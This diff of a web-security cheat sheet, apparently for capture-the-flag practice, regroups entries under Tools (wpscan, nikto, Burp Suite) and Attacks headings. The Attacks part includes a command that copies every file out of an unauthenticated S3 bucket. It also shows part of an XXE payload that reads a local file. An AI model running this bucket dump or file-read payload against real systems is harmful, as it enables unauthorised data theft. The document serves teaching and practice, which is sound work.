@@ -1,7 +1,28 @@
+## Tools
+
 * `wpscan` - [Website](https://wpscan.org/)
 
   Scan [Wordpress](https://en.wikipedia.org/wiki/WordPress) sites for vulnerabilities.
 
+
+* `nikto` - [GitHub](https://github\.com/sullo/nikto)
+
+	Website scanner implemented in [Perl](https://en.wikipedia.org/wiki/Perl).
+
+
+* `Burpsuite` :heart: - [Website](https://portswigger.net/burp)
+
+	Most used tool to do web pentesting. It is a proxy that allows you to intercept and modify HTTP requests and responses.
+
+## Attacks
+
+* AWS / S3 Buckets dump
+
+	Dump all files from a S3 bucket that does not require authentication.
+
+	``` bash
+	aws s3 cp --recursive --no-sign-request s3://<bucket_name> .
+	```
 
 * XXE : XML External Entity
 
@@ -17,23 +38,4 @@
 	<!ENTITY file SYSTEM "file:///flag">
 	]>
 	<data>&file;</data>
-	```
-
-
-* `nikto` - [GitHub](https://github\.com/sullo/nikto)
-
-	Website scanner implemented in [Perl](https://en.wikipedia.org/wiki/Perl).
-
-
-* `Burpsuite` :heart: - [Website](https://portswigger.net/burp)
-
-	Most used tool to do web pentesting. It is a proxy that allows you to intercept and modify HTTP requests and responses.
-
-
-* AWS / S3 Buckets dump
-
-	Dump all files from a S3 bucket that does not require authentication.
-
-	``` bash
-	aws s3 cp --recursive --no-sign-request s3://<bucket_name> .
 	```
